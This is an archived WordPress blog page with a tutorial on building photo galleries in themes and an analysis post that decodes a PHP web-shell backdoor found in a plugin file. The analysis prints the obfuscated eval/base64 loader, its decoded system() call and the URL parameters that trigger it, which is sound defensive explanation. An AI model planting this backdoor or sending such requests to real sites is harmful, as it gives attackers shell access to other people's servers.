http://ottopress.com/category/code/page/5/
HTTP/1.1 200 OK
Server: nginx/1.4.4
Date: Tue, 22 Jul 2014 13:24:12 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Pingback: http://ottopress.com/xmlrpc.php

<!DOCTYPE html>
<html lang="en-US">

<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

<title>Code &raquo; Otto on WordPress</title>

<link rel="profile" href="http://www.w3.org/1999/xhtml/vocab" />
<link rel="me" type="text/html" href="https://plus.google.com/100201852715113506716" />

<link rel="stylesheet" href="http://ottopress.com/wp-content/themes/fluid-blue/style.css" type="text/css" media="screen" />
<link rel="stylesheet" href="http://ottopress.com/wp-content/themes/fluid-blue/print.css" type="text/css" media="print" />

<link rel="pingback" href="http://ottopress.com/xmlrpc.php" />

<meta property="og:email" content="otto@ottodestruct.com" />
<meta http-equiv="X-UA-Compatible" content="chrome=1">

<script type="text/javascript">var description = '';</script>
<!-- Jetpack Site Verification Tags -->
<meta name="google-site-verification" content="IvlRFnRHu9RIiAiOS-bo-8vU4ju4V6_b4U3M_-1jlXQ" />
<link rel="alternate" type="application/rss+xml" title="Otto on WordPress &raquo; Feed" href="http://ottopress.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Otto on WordPress &raquo; Comments Feed" href="http://ottopress.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Otto on WordPress &raquo; Code Category Feed" href="http://ottopress.com/category/code/feed/" />
<link rel='stylesheet' id='yarppWidgetCss-css'  href='http://ottopress.com/wp-content/plugins/yet-another-related-posts-plugin/style/widget.css?ver=3.9.1' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack-subscriptions-css'  href='http://ottopress.com/wp-content/plugins/jetpack/modules/subscriptions/subscriptions.css?ver=3.9.1' type='text/css' media='all' />
<link rel='stylesheet' id='the-neverending-homepage-css'  href='http://ottopress.com/wp-content/plugins/jetpack/modules/infinite-scroll/infinity.css?ver=20140422' type='text/css' media='all' />
<link rel='stylesheet' id='tiled-gallery-css'  href='http://ottopress.com/wp-content/plugins/jetpack/modules/tiled-gallery/tiled-gallery/tiled-gallery.css?ver=2012-09-21' type='text/css' media='all' />
<link rel='stylesheet' id='mediaelement-css'  href='http://ottopress.com/wp-includes/js/mediaelement/mediaelementplayer.min.css?ver=2.13.0' type='text/css' media='all' />
<link rel='stylesheet' id='wp-mediaelement-css'  href='http://ottopress.com/wp-includes/js/mediaelement/wp-mediaelement.css?ver=3.9.1' type='text/css' media='all' />
<script type='text/javascript' src='http://ottopress.com/wp-includes/js/jquery/jquery.js?ver=1.11.0'></script>
<script type='text/javascript' src='http://ottopress.com/wp-includes/js/jquery/jquery-migrate.js?ver=1.2.1'></script>
<script type='text/javascript' src='http://ottopress.com/wp-content/plugins/jetpack/modules/tiled-gallery/tiled-gallery/tiled-gallery.js?ver=3.9.1'></script>
<script type='text/javascript' src='http://ottopress.com/wp-content/plugins/jetpack/_inc/spin.js?ver=1.3'></script>
<script type='text/javascript' src='http://ottopress.com/wp-content/plugins/jetpack/_inc/jquery.spin.js?ver=1.3'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://ottopress.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://ottopress.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 3.9.1" />
<meta name="pinterest" content="nopin" /><link rel="microsummary" type="text/plain" href="/category/code/page/5/?microsummary=1" /><link rel="shortcut icon" href="http://ottopress.com/wp-content/wp-logo-vs.png" /><style type="text/css" id="syntaxhighlighteranchor"></style>
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-27538437-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>
</head>

<body class="archive paged category category-code category-573 paged-5 category-paged-5 infinite-scroll neverending">
<script type="text/javascript">
if (top.location != self.location) top.location.replace(self.location);
</script>
<div id="page">
<div id="header">
	<div id="headertitle">
		<h1><a href="http://ottopress.com" title="Otto on WordPress: You have to use an Ottopress to get fresh squeezed Otto.">Otto on WordPress</a></h1>
		<p>You have to use an Ottopress to get fresh squeezed Otto.</p>
	</div> 
	<!-- Search box (If you prefer having search form as a sidebar widget, remove this block) -->
	<div class="search">
		<form method="get" id="searchform" action="http://ottopress.com/">
<input type="search" size="20" results="5" name="s" id="s" placeholder="Search..." speech="speech" x-webkit-speech="x-webkit-speech" onwebkitspeechchange="this.form.submit();" />
</form>
	</div> 
	<!-- Search ends here-->
		
</div>
<div id="navbar">
<div id="nav">
<div class="menu"><ul><li ><a href="http://ottopress.com/">Home</a></li><li class="page_item page-item-5 page_item_has_children"><a href="http://ottopress.com/wordpress-plugins/">WordPress Plugins</a><ul class='children'><li class="page_item page-item-205"><a href="http://ottopress.com/wordpress-plugins/atd-for-comments/">After The Deadline For Comments</a></li><li class="page_item page-item-21"><a href="http://ottopress.com/wordpress-plugins/atom-default-feed/">Atom Default Feed</a></li><li class="page_item page-item-965"><a href="http://ottopress.com/wordpress-plugins/dropbox-photo-sideloader/">Dropbox Photo Sideloader</a></li><li class="page_item page-item-15"><a href="http://ottopress.com/wordpress-plugins/gravatar-box/">Gravatar Box</a></li><li class="page_item page-item-32"><a href="http://ottopress.com/wordpress-plugins/php-code-widget/">PHP Code Widget</a></li><li class="page_item page-item-7"><a href="http://ottopress.com/wordpress-plugins/simple-facebook-connect/">Simple Facebook Connect</a></li><li class="page_item page-item-10"><a href="http://ottopress.com/wordpress-plugins/simple-twitter-connect/">Simple Twitter Connect</a></li><li class="page_item page-item-81"><a href="http://ottopress.com/wordpress-plugins/unicornify/">Unicornify</a></li></ul></li><li class="page_item page-item-374"><a href="http://ottopress.com/contact/">Contact Otto</a></li><li><a href="http://ottodestruct.com" title="Nothing to See Here">Nothing to See Here</a></li><li><a href="http://buyottoabeer.com" title="Otto on Beer">Otto on Beer</a></li></ul></div>
	</div>
</div>
<div id="wrapper">
	<div id="content">

	
			<p>Archive for the &#8216;Code&#8217; Category.</p>

 				
		<div class="navigation">
			<div class="alignleft"><a href="http://ottopress.com/category/code/page/6/" >&laquo; Previous Entries</a></div>
			<div class="alignright"><a href="http://ottopress.com/category/code/page/4/" >Next Entries &raquo;</a></div>
		</div>

					<div id="post-372" class="post-372 post type-post status-publish format-standard hentry category-code category-wordpress tag-attachments tag-gallery tag-image tag-pages tag-posts tag-wordpress-2" itemprop="blogPosts" itemscope itemtype="http://schema.org/BlogPosting">
				<h2 class="posttitle"><a href="http://ottopress.com/2011/photo-gallery-primer/" rel="bookmark" title="Permanent Link to Photo Gallery Primer" itemprop="url"><span itemprop="name">Photo Gallery Primer</span></a></h2>
				<div class="postmetadata">May 25, 2011, 6:39 pm <!-- by <span rel="author">Samuel “Otto” Wood</span> --></div>
				<div class="postentry" itemprop="description">
					<p>I have seen many questions from people about how to create photo galleries in WordPress. But often I see these questions answered by somebody recommending a plugin or something like that. You don&#8217;t really need plugins to create photo galleries. WordPress has a huge amount of gallery functionality built right in. You just need to make your theme smarter in order to take advantage of it.</p>
<p>Note: <a href="http://ma.tt">Matt</a> has one of the neatest photo gallery implementations around, and he often gets questions about it. So I&#8217;m going to refer to it from time to time in this post. Maybe you&#8217;ll want to <a href="http://ma.tt/gallery/">head over there</a> and familiarize yourself with some of the look and features of it.</p>
<h3>Understanding the Gallery Concept</h3>
<p>One of the first things you need to know is how WordPress organizes Galleries. A gallery is really just a post with a bunch of images attached to it.</p>
<p>While editing a post or creating a new one, you have the option to upload images or other files. When you upload a file through the file Uploader, WordPress creates a post just for that file. This post has a post_type of &#8220;attachment&#8221;. Images in particular get some extra processing, and they show up in multiple sizes, you can insert them into the posts, etc. You probably already knew that. You probably have seen the gallery inserter, which just inserts the &#8220;gallery&#8221; shortcode into your post.</p>
<p>What you might not have known is that it&#8217;s doing more than you think. It&#8217;s not just resizing those images you&#8217;re uploading, but it&#8217;s pulling out metadata and other information about the image too. It&#8217;s grabbing <a href="http://hyperboleandahalf.blogspot.com/2010/04/alot-is-better-than-you-at-everything.html">alot</a> of the EXIF data from the image and storing it as postmeta items for that attachment post. The post itself, being a post, gets its own URL, which is the post that it is attached to&#8217;s URL followed by the attachment posts title. Basically, an attachment post is sorta like a child of the parent post, which contains the gallery. So all a gallery really is is the sum of the attachments posts that are children of the gallery post itself.</p>
<div id="attachment_503" style="width: 610px" class="wp-caption aligncenter"><a rel="attachment wp-att-503" href="http://ottopress.com/2011/photo-gallery-primer/gallerychart/"><img class="size-medium wp-image-503" title="Gallerychart" src="http://i1.wp.com/ottopress.com/files/2010/12/Gallerychart.png?resize=600%2C246" alt="" data-recalc-dims="1" /></a><p class="wp-caption-text">Graph of the Gallery concept</p></div>
<p>Is that clear as mud? Don&#8217;t worry, it&#8217;s simpler to work with than you think.</p>
<h3>Create an Image Template</h3>
<p>First thing you need to do is to edit your theme (or create a child theme, if you prefer). What you&#8217;re going to do is to make an &#8220;image.php&#8221; file.</p>
<p>(Side note: If you browse through the source of WordPress, you&#8217;ll never find where it loads the &#8220;image.php&#8221; file, because it isn&#8217;t there. What it is actually doing is looking for the mimetype of the attachment as a filename. So since you uploaded, say, a JPG file, then the mimetype is image/jpeg. It splits that and looks for image.php, followed by jpeg.php, followed by image_jpeg.php, and finally just attachment.php as the generic base. It does this for any and all attachments, and any and all mime types. So you can have a video.php for video attachments, audio.php for audio attachments, etc.)</p>
<p>The image.php file is the template that will load for &#8220;single images&#8221;. A gallery shows thumbnails, but when you click on them, you go to the attachment page for just that image. An easy way to start with your custom image page is to copy your existing single post page to it. Just copy single.php to image.php. If you don&#8217;t have a single.php, maybe you should try copying the index.php file instead.</p>
<h3>Modify your Image Template</h3>
<p>Since this is an image, it&#8217;s going to have things in it that normal posts don&#8217;t. It&#8217;s also going to need special navigational entries that other posts don&#8217;t have.</p>
<p>For starters, it has a parent, which is the post containing the gallery. So what if we want to display the gallery post&#8217;s name? Easy, we can reference the parent using $post->post_parent. So code like get_the_title($post->post_parent) will get us that title so we can echo it. Similarly, using something like get_permalink($post->post_parent) will get us the link back to the gallery. So this sort of code in our image template will display that link:</p>
<pre class="brush: php; title: ; notranslate" title="">
echo &quot;&lt;a href='&quot; . get_permalink($post-&gt;post_parent). &quot;'&gt;Go back to &quot;. get_the_title($post-&gt;post_parent) .&quot;&lt;/a&gt;&quot;;
</pre>
<p>For navigation, we have special functions. previous_image_link and next_image_link will let us display links to the previous or next images in the gallery order. Each of these takes two parameters. The first is the size of the previous or next image we want to display (or false to not show a thumbnail at all), the second optional parameter is some text to put in the link. So to show a couple of text navigational links, this code would work:</p>
<pre class="brush: php; title: ; notranslate" title="">
echo previous_image_link(false,'Previous Photo');
echo next_image_link(false,'Next Photo');
</pre>
<p>If I wanted to display image links instead, I could change that false to &#8216;thumbnail&#8217; to display the thumbnail sized images. Or &#8216;medium&#8217;. Or whatever size I preferred.</p>
<p>Next we want to display the image. The wp_get_attachment_image function takes care of that easily:</p>
<pre class="brush: php; title: ; notranslate" title="">
echo wp_get_attachment_image( $post-&gt;ID, 'medium' );
</pre>
<p>The second parameter there is the size we want to display it at. You could also use &#8216;large&#8217;, &#8216;full&#8217;, &#8216;thumbnail&#8217;, etc. Any of the image sizes. If you want the image to be clickable, you might wrap it in an A tag and link it to the image itself.</p>
<p>But remember that attachment posts are still posts. All those fields you can enter on the image uploader are available to you to use. For example, the &#8220;Title&#8221; is stored in the normal Post Title field, so calling the_title() will display that. The Description is stored in the Content field and can be displayed with the_content(). The Caption is stored in the Excerpt field and can be displayed with the_excerpt(). You should use these as needed.</p>
<h3>EXIF Information</h3>
<p>Here&#8217;s an example of one of Matt&#8217;s single image pages, showing a balloon: <a href="http://ma.tt/2011/05/balloon-ride/mcm_9033/">http://ma.tt/2011/05/balloon-ride/mcm_9033/</a>.</p>
<p>Nice shot. Scroll down a bit and look on the right hand side of that page, where it says INFO. Lots of nifty information there. But he didn&#8217;t put any of that in, WordPress did it all by itself.</p>
<p>To gain access to that information in your image.php file, you use this code:</p>
<pre class="brush: php; title: ; notranslate" title="">
$imagemeta = wp_get_attachment_metadata();
</pre>
<p>If you examine this array, you find that it contains widths, heights, filenames of the various sizes of thumbnails generated, etc. But it also contains an array called &#8220;image_meta&#8221;. This is an array of information that represents everything WordPress was able to glean from the image itself. After you know this, it&#8217;s just a matter of displaying it properly.</p>
<p>For example, to display the camera name, he has code similar to this:</p>
<pre class="brush: php; title: ; notranslate" title="">
if ($imagemeta['image_meta']['camera']) {
	echo &quot;Camera: &quot; . $imagemeta['image_meta']['camera'];
}
</pre>
<p>There&#8217;s other bits in there, like Aperture, Focal Length, ISO settings, and Shutter Speed. Most of these are straightforward, except for shutter speed which is often not in an easy format to display. Usually it&#8217;s a fractional value, represented as a decimal. Often we want to convert this to the fractional display. Here&#8217;s a bit of code I wrote to do that. It&#8217;s not perfect, but what is?</p>
<pre class="brush: php; title: ; notranslate" title="">
if ($imagemeta['image_meta']['shutter_speed']) {
	echo 'Shutter: ';

	// shutter speed handler
	if ((1 / $imagemeta['image_meta']['shutter_speed']) &gt; 1) {
	echo &quot;1/&quot;;
		if (number_format((1 / $imagemeta['image_meta']['shutter_speed']), 1) ==  number_format((1 / $imagemeta['image_meta']['shutter_speed']), 0)) {
			echo number_format((1 / $imagemeta['image_meta']['shutter_speed']), 0, '.', '') . ' sec';
		} else {
			echo number_format((1 / $imagemeta['image_meta']['shutter_speed']), 1, '.', '') . ' sec';
		}
	} else {
		echo $imagemeta['image_meta']['shutter_speed'].' sec';
	}
}
</pre>
<p>Ugly, I know, but it gets the job done, more or less. Works on most shutter speeds I&#8217;ve tested it with.</p>
<h3>Gallery Formatting in the Stream</h3>
<p>Now, obviously you want your posts to look good in the normal flow of the blog as well. Twenty-Ten and the upcoming Twenty-Eleven themes both show you how to do this rather easily. Twenty-Ten used the &#8220;gallery&#8221; category for this at one point, before Post Formats came along and made that method obsolete. Now it uses the gallery post format instead.</p>
<p>So first, obviously, your theme will need to support the gallery post format. This is easy, just add this to your theme&#8217;s functions.php if it doesn&#8217;t have gallery support already (or add &#8220;gallery&#8221; to it if it does have post format support).</p>
<pre class="brush: php; title: ; notranslate" title="">
add_theme_support( 'post-formats', array( 'gallery') );
</pre>
<p>Now that that&#8217;s done, you have the option of choosing gallery as a post format. So you need to edit your theme to use that flag as an indicator to display things differently.</p>
<p>There&#8217;s plenty of <a href="http://ottopress.com/2011/post-formats-presentation/">tutorials</a> <a href="http://codex.wordpress.org/Post_Formats">on</a> <a href="http://lisasabin-wilson.com/wordpress-3-1-post-formats-reference">post</a> <a href="http://www.netmagazine.com/features/wordpress-post-formats-made-easy">formats</a> out there, so I&#8217;ll assume you&#8217;re more than capable of figuring out how to use has_post_format(&#8216;gallery&#8217;) or the &#8220;.home .format-gallery&#8221; CSS indicators to style the posts as needed.</p>
<p>What you need to know for specific gallery formatting in the main stream of the blog is how to display a selected representative image from the gallery there instead of the whole thing. There&#8217;s two basic steps to this.</p>
<p>First, you have to write your post appropriately to begin with. Take one of Matt&#8217;s posts for example: <a href="http://ma.tt/2011/05/20/">http://ma.tt/2011/05/20/</a></p>
<p>Here&#8217;s how that post actually looks in the editor:</p>
<pre class="brush: xml; title: ; notranslate" title="">
Description text at the top here... Went for balloon ride, etc.
&lt; !--more-- &gt;
[ gallery ]
</pre>
<p>In other words, he puts the description first, then the more tag, then the gallery after it. This has the effect of giving a natural separation of the description content and the gallery itself. The gallery is not displayed on the front page, because it&#8217;s after the more tag. So a call to the_content() on the stream pages will only show the description.</p>
<p>Secondly, you can easily adapt the Featured Image function to let you choose which image to display in the stream. All the user has to do is to upload their gallery then select one and set it to be the featured image. Voila, it&#8217;ll be the main representative one used.</p>
<pre class="brush: php; title: ; notranslate" title="">
if ( has_post_thumbnail() ) {
        // use the thumbnail (&quot;featured image&quot;)
        $thumb_id = get_post_thumbnail_id();
	the_post_thumbnail( $size ); // whatever size you want
}
</pre>
<p>By tossing a div around that, you can then float it left, or right, or whatever you prefer to do. With some extra code and the use of the get_children function, you can make this default to the first image in the gallery if they don&#8217;t choose a featured image.</p>
<pre class="brush: php; title: ; notranslate" title="">
else {
	$attachments = get_children( array(
		'post_parent' =&gt; get_the_ID(),
		'post_status' =&gt; 'inherit',
		'post_type' =&gt; 'attachment',
		'post_mime_type' =&gt; 'image',
		'order' =&gt; 'ASC',
		'orderby' =&gt; 'menu_order ID',
		'numberposts' =&gt; 1)
	);
	foreach ( $attachments as $thumb_id =&gt; $attachment )
		echo wp_get_attachment_image($thumb_id, $size); // whatever size you want
	}
}
</pre>
<p>Using tricks like this, you can get the bits of the gallery yourself and display them in different ways.</p>
<h3>Make a Gallery Specific Page Template</h3>
<p>Matt&#8217;s <a href="http://ma.tt/gallery/">Gallery Page</a> is itself customized. It displays the galleries in an entirely different way. There&#8217;s a big copy of the featured image, along with a few thumbnails below the description, and it even has a count of the images in each &#8220;album&#8221;. This is all done with a pretty straightforward page template.</p>
<p>So to start, make a Page Template:</p>
<pre class="brush: php; title: ; notranslate" title="">
/*
Template Name: Gallery
*/
</pre>
<p>Right at the top of the template, we&#8217;re going to add a special taxonomy query, which will get all the gallery posts (as well those in the gallery category, since we&#8217;re being backward compatible and all). So here&#8217;s the code:</p>
<pre class="brush: php; title: ; notranslate" title="">
$args = wp_parse_args($query_string);

query_posts(array(
         'tax_query' =&gt; array(
                'relation' =&gt; 'OR',
                array(
                        'taxonomy' =&gt; 'post_format',
                        'terms' =&gt; array('post-format-gallery'),
                        'field' =&gt; 'slug',
                ),
                array(
                        'taxonomy' =&gt; 'category',
                        'terms' =&gt; array('gallery'),
                        'field' =&gt; 'slug',
                ),
        ),
        'paged' =&gt; $args['paged'],
) );
</pre>
<p>First we parse the normal arguments, then we override them with our own query. The only argument we really use from the normal set is the page number, for multiple paging.</p>
<p>Our overriden query uses an advanced taxonomy query. In this case, it selects any posts in the gallery post format, or any post with a category of gallery. By passing this to query_posts, we override our main page query, and thus our main Loop will now display the gallery posts only.</p>
<p>After this, it&#8217;s just a matter of displaying what we want to display.</p>
<p>The main Loop itself is pretty straightforward. To display that featured image, we use essentially the same code as we used before, only passing it a bigger size.</p>
<p>To display the description, we just use the_content() as per usual. One thing we have to do though is to set the global $more value to zero, so that it stops at the !&#8211;more&#8211; tag, preventing it from continuing to display the whole gallery.</p>
<p>Getting the count turns out to kinda suck. There&#8217;s no good function in WordPress to do this for you easily. So, reluctantly, I resorted to an SQL query.</p>
<pre class="brush: php; title: ; notranslate" title="">
echo $wpdb-&gt;get_var( &quot;SELECT COUNT(*) FROM $wpdb-&gt;posts WHERE post_parent = '$post-&gt;ID' AND post_type = 'attachment'&quot; ) .' PHOTOS IN THIS SET';
</pre>
<p>The four thumbnails you can do using the get_children trick. However, there&#8217;s a catch. We don&#8217;t want to display the featured image as one of those four thumbnails. So, since we&#8217;ve already displayed that image (see the code above), we have the $thumb_id variable still. So we&#8217;ll use that to not get that image. Like so:</p>
<pre class="brush: php; title: ; notranslate" title="">
$attachments = get_children( array(
	'post_parent' =&gt; get_the_ID(),
	'post_status' =&gt; 'inherit',
	'post_type' =&gt; 'attachment',
	'post_mime_type' =&gt; 'image',
	'order' =&gt; 'ASC',
	'orderby' =&gt; 'menu_order ID',
	'numberposts' =&gt; 4,
	'exclude' =&gt; $thumb_id )
);
foreach ( $attachments as $img =&gt; $attachment ) {
	echo '&lt;a href=&quot;'.get_permalink($img).'&quot;&gt;'.wp_get_attachment_image( $img, $size ).'&lt;/a&gt;';
}
</pre>
<p>By using the exclude parameter, we can get the first four images in the gallery without getting that featured image again, if it&#8217;s in those first four images.</p>
<h4>Update</h4>
<p><a href="http://andrewnacin.com/">Andrew Nacin</a> pointed out that I can combine the act of getting those four children and getting the attachment count into a single new WP_Query, like so:</p>
<pre class="brush: php; title: ; notranslate" title="">
$images = new WP_Query( array(
    'post_parent' =&gt; get_the_ID(),
    'post_status' =&gt; 'inherit',
    'post_type' =&gt; 'attachment',
    'post_mime_type' =&gt; 'image',
    'order' =&gt; 'ASC',
    'orderby' =&gt; 'menu_order ID',
    'posts_per_page' =&gt; 4,
    'post__not_in' =&gt; array($thumb_id),
    'update_post_term_cache' =&gt; false,
) );
</pre>
<p>This creates a new secondary query that I can loop through like so, to show the children:</p>
<pre class="brush: php; title: ; notranslate" title="">
foreach ($images-&gt;posts as $image) {
	echo '&lt;a href=&quot;'.get_permalink($image-&gt;ID).'&quot;&gt;'.wp_get_attachment_image( $image-&gt;ID, $size ).'&lt;/a&gt;';
}
</pre>
<p>It also has the side benefit of doing the primary counting of the images for me, via the <a href="http://dev.mysql.com/doc/refman/5.0/en/information-functions.html#function_found-rows">SQL_CALC_FOUND_ROWS</a> that WordPress uses in full-blown queries. However, the count will be off by 1, since we&#8217;re excluding the featured thumbnail. Therefore, I just have to add one to it:</p>
<pre class="brush: php; title: ; notranslate" title="">
echo ($images-&gt;found_posts+1) . ' PHOTOS IN THIS SET';
</pre>
<p>That combines both of those elements into one query instead of two, and eliminates the need for the direct SQL query.</p>
<p>(Side note: I also set &#8216;update_post_term_cache&#8217; to false to prevent it from doing an extra query to get the terms for these posts into the internal memory cache. This saves us a bunch of unnecessary queries, since I&#8217;m not using the terms here anyway. Using full WP_Query objects instead of the simpler ones like get_children can take a little bit more thought and effort, but can save you time in the long run, if used wisely.)</p>
<h3>Sizes</h3>
<p>Throughout this post I&#8217;ve used $size as a generic indicator of where to put the size parameter. WordPress creates sized images by default, as we all know. These are thumbnail, medium, large, and full which is just the full sized uploaded image, unmodified.</p>
<p>But WordPress can create other sizes too, if you like. At different points throughout Matt&#8217;s gallery pages, you&#8217;ll see images displayed in all sizes. These sizes are custom, and they&#8217;re added in the functions.php file.</p>
<pre class="brush: php; title: ; notranslate" title="">
add_image_size( 'nav-thumbnail', 100, 100, true );
add_image_size( 'random-thumbnail', 200, 150, true );
add_image_size( 'gallery-thumbnail', 250, 200, false );
add_image_size( 'gallery-large', 660, 500, false );
add_image_size( 'gallery-pagethumb', 70, 70, true );
</pre>
<p>The add_image_size function takes a width, a height, and a flag to cause it to crop or not. So those tiny thumbnails on the gallery are &#8220;gallery-pagethumb&#8221; sized, and are 70&#215;70, cropped. Anywhere I need one of those sizes, I can just pass that parameter instead of $size and voila.</p>
<p>Obviously though, adding too many sizes is undesirable, because it takes time to create those sizes (they&#8217;re created on upload of the images), and it takes storage space to store them. Hopefully a future version of WordPress can work around this issue.</p>
<h3>Conclusion</h3>
<p>These are the basics of making cool galleries, without plugins, without special uploaders, and while being able to style it to match your theme. Play with it. Experiment. There&#8217;s a ton of functions in WordPress specifically for dealing with these. Take a look through wp-includes/media.php and look at some of the function names. You might be surprised.</p>
				</div>

<div style="clear:both;"><span class="post-shortlink">Shortlink: 
<input type='text' value='http://otto42.com/9g' onclick='this.focus(); this.select();' />
</span></div>

				<div class="postmetadata">
					Tags: <a href="http://ottopress.com/tag/attachments/" rel="tag">attachments</a>, <a href="http://ottopress.com/tag/gallery/" rel="tag">gallery</a>, <a href="http://ottopress.com/tag/image/" rel="tag">image</a>, <a href="http://ottopress.com/tag/pages/" rel="tag">pages</a>, <a href="http://ottopress.com/tag/posts/" rel="tag">posts</a>, <a href="http://ottopress.com/tag/wordpress-2/" rel="tag">WordPress</a><br />					Category: <a href="http://ottopress.com/category/code/" title="View all posts in Code" rel="category tag">Code</a>, <a href="http://ottopress.com/category/wordpress/" title="View all posts in WordPress" rel="category tag">WordPress</a>&nbsp;&nbsp;|&nbsp;
					<a href="http://ottopress.com/2011/photo-gallery-primer/#comments" title="Comment on Photo Gallery Primer">55 Comments</a>									 </div>
			</div>			<div id="post-479" class="post-479 post type-post status-publish format-standard hentry category-code category-other tag-backdoor tag-base64_decode tag-eval tag-evil tag-malware tag-russian tag-shell" itemprop="blogPosts" itemscope itemtype="http://schema.org/BlogPosting">
				<h2 class="posttitle"><a href="http://ottopress.com/2011/decoding-a-russian-hackers-code/" rel="bookmark" title="Permanent Link to Decoding a Russian Hacker&#8217;s Code" itemprop="url"><span itemprop="name">Decoding a Russian Hacker&#8217;s Code</span></a></h2>
				<div class="postmetadata">April 18, 2011, 10:50 am <!-- by <span rel="author">Samuel “Otto” Wood</span> --></div>
				<div class="postentry" itemprop="description">
					<p>I was alerted to this tweet by @andrea_r this morning:</p>
<blockquote class="twitter-tweet" width="550"><p>Uh oh&#8230; This was in wp-content/plugins/akismet/admin.php. <a href="http://pastie.org/1806790">http://pastie.org/1806790</a> <a href="https://twitter.com/search/%23WordPress">#WordPress</a></p>
<p>&mdash; Scott Basgaard (@scottbasgaard) <a href="https://twitter.com/scottbasgaard/status/59950250563092480" data-datetime="2011-04-18T12:03:48+00:00">April 18, 2011</a></p></blockquote>
<p><script src="//platform.twitter.com/widgets.js" charset="utf-8"></script></p>
<p>Here&#8217;s the code in question:</p>
<pre class="brush: php; title: ; notranslate" title="">
&lt;?php
@$str1 = &quot;0cmVhbT1AJF9HRVRbJz&quot; . $HTTPS_ACCEPT_URLENCODING['KOI8-R'];
@$str2 = &quot;B4RkYnXTtAc3lzdGVtK&quot; . $HTTPS_ACCEPT_URLENCODING['WIN-1251'];
@$str3 = &quot;CRuZXdzdHJlYW0pOw==&quot; . $HTTP_ACCEPT_URLENCODING['UTF-8'];
@eval(base 64_decode($_GET['salt'] . $str1 . $str2 . $str3));
?&gt;
</pre>
<p>Decoding this is a rather simple matter. First, we remove the eval line and do a var_dump on the variables. We get this:</p>
<pre class="brush: plain; title: ; notranslate" title="">
&gt;php test.php
string(19) &quot;0cmVhbT1AJF9HRVRbJz&quot;
string(19) &quot;B4RkYnXTtAc3lzdGVtK&quot;
string(19) &quot;CRuZXdzdHJlYW0pOw==&quot;
</pre>
<p>Notice that the HTTP_ACCEPT_URLENCODING mess is a red herring. It&#8217;s there to make it look more legit, sort of thing.</p>
<p>So now we have this string: &#8220;0cmVhbT1AJF9HRVRbJzB4RkYnXTtAc3lzdGVtKCRuZXdzdHJlYW0pOw==&#8221;. Unfortunately, it is incomplete. Note the &#8220;salt&#8221; parameter being used in the eval(base 64_decode()) line. </p>
<p>Well, a bit of searching turned up the fact that the salt is supposed to be &#8220;JG5ld3N&#8221;. So somebody can send a ?salt=JG5ld3N parameter in an HTTP request and get the following string to decode: &#8220;JG5ld3N0cmVhbT1AJF9HRVRbJzB4RkYnXTtAc3lzdGVtKCRuZXdzdHJlYW0pOw==&#8221;.</p>
<p>So we run that through a base64 decoder and get this:</p>
<pre class="brush: php; title: ; notranslate" title="">
$newstream=@$_GET['0xFF'];@system($newstream);
</pre>
<p>So it&#8217;s just performing a system call on whatever comes in via the 0xFF parameter. Ah ha! It&#8217;s a shell backdoor. I can make a hit to example.com?salt=JG5ld3N&#038;0xFF=**any-command-I-want** and have it execute it in the shell.</p>
<p>Fortunately, this is not a particularly well hidden example. The use of &#8220;eval&#8221; and &#8220;base 64_decode&#8221; is a dead giveaway, as is the use of unchecked $GET parameters.</p>
<p>Most likely, Scott got hacked through either bad permissions on a shared server or somebody got ahold of his FTP credentials somehow. It&#8217;s hard to say without seeing his server logs, but checking through all files on the system is probably a good idea. </p>
<p>As always, the <a href="http://codex.wordpress.org/FAQ_My_site_was_hacked">Codex has some good suggestions</a>.</p>
				</div>

<div style="clear:both;"><span class="post-shortlink">Shortlink: 
<input type='text' value='http://otto42.com/9c' onclick='this.focus(); this.select();' />
</span></div>

				<div class="postmetadata">
					Tags: <a href="http://ottopress.com/tag/backdoor/" rel="tag">backdoor</a>, <a href="http://ottopress.com/tag/base64_decode/" rel="tag">base64_decode</a>, <a href="http://ottopress.com/tag/eval/" rel="tag">eval</a>, <a href="http://ottopress.com/tag/evil/" rel="tag">evil</a>, <a href="http://ottopress.com/tag/malware/" rel="tag">malware</a>, <a href="http://ottopress.com/tag/russian/" rel="tag">russian</a>, <a href="http://ottopress.com/tag/shell/" rel="tag">shell</a><br />					Category: <a href="http://ottopress.com/category/code/" title="View all posts in Code" rel="category tag">Code</a>, <a href="http://ottopress.com/category/other/" title="View all posts in Other" rel="category tag">Other</a>&nbsp;&nbsp;|&nbsp;
					<a href="http://ottopress.com/2011/decoding-a-russian-hackers-code/#comments" title="Comment on Decoding a Russian Hacker&#8217;s Code">16 Comments</a>									 </div>
			</div>			<div id="post-471" class="post-471 post type-post status-publish format-standard hentry category-code category-wordpress" itemprop="blogPosts" itemscope itemtype="http://schema.org/BlogPosting">
				<h2 class="posttitle"><a href="http://ottopress.com/2011/tutorial-using-the-wp_filesystem/" rel="bookmark" title="Permanent Link to Tutorial: Using the WP_Filesystem" itemprop="url"><span itemprop="name">Tutorial: Using the WP_Filesystem</span></a></h2>
				<div class="postmetadata">April 5, 2011, 3:28 pm <!-- by <span rel="author">Samuel “Otto” Wood</span> --></div>
				<div class="postentry" itemprop="description">
					<p><em>Note: An actual working implementation of the WP_Filesystem can be found in my <a href="http://wordpress.org/extend/plugins/pluginception/">Pluginception</a> plugin.</em></p>
<p>Lot of talk amongst theme authors recently about writing local files. Writing files from code, whether it be from a theme or from a plugin, is generally bad mojo. However understanding why you shouldn&#8217;t is confusing to many, and then understanding why you shouldn&#8217;t do-it-yourself and should use the WP_Filesystem is even more confusing. To further muddy up the waters, many theme authors have expressed confusion at how to use WP_Filesystem in the first place.</p>
